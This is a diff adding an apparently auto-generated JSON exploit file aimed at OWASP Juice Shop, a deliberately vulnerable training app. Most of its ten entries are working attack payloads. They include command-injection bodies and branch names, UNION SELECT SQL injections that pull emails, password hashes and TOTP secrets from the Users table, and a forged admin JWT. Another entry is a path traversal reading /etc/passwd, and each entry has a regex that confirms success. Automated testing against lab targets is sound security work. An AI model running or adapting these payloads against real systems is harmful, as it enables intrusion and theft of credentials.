@@ -1,0 +1,109 @@
+{
+  "metadata": {
+    "target_host": "http://juice-shop:3000",
+    "job_id": "576298cd-ad6f-41f4-ab7c-0600260603c3",
+    "generated_at": "2026-06-02T04:21:57.220221"
+  },
+  "exploits": [
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "SAST_FINDING",
+      "headers": {
+        "Content-Type": "text/plain"
+      },
+      "body": "v1.0; echo 'SAST_RCE_SUCCESS'; id",
+      "expected_success_regex": "SAST_RCE_SUCCESS\\s*uid=\\d+\\([a-zA-Z0-9]+\\) gid=\\d+\\([a-zA-Z0-9]+\\) groups=\\d+\\([a-zA-Z0-9]+\\)"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "SAST_FINDING",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"branch_name\": \"poc-branch-name\"; id; echo 'COMMAND_INJECTION_SUCCESS' #\"}",
+      "expected_success_regex": "uid=\\d+\\(.*\\) gid=\\d+\\(.*\\) groups=\\d+\\(.*\\).*COMMAND_INJECTION_SUCCESS"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "Error",
+      "method": "POST",
+      "endpoint": "SAST_FINDING",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"description\": \"This request simulates the creation of a Git branch with a malicious name. The 'branch_name' value is what gets injected into the shell command in the GitHub Actions workflow via the github.ref_name context.\", \"branch_name\": \"feature/new-poc;id\"}",
+      "expected_success_regex": "uid=\\d+\\([a-zA-Z0-9_\\-]+\\) gid=\\d+\\([a-zA-Z0-9_\\-]+\\) groups="
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "\"name\":\"admin@juice-sh\\\\.op\",.*\"description\":\"[a-f0-9]{32}\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret, 1 FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT id,email,password,role,null,null,null,null FROM Users--",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "Error",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret, 1 from Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+      "severity": "Warning",
+      "method": "GET",
+      "endpoint": "/api/Users",
+      "headers": {
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifSwiaWF0IjoxNTE2MjM5MDIyfQ.ifVw4K52Lz1lG3aKj-n3VbBvH4n12B2y2Nf3M0K0iIk"
+      },
+      "body": "",
+      "expected_success_regex": "\"email\":\"admin@juice-sh\\.op\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+      "severity": "Warning",
+      "method": "GET",
+      "endpoint": "/ftp/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "root:.*:0:0"
+    }
+  ]
+}
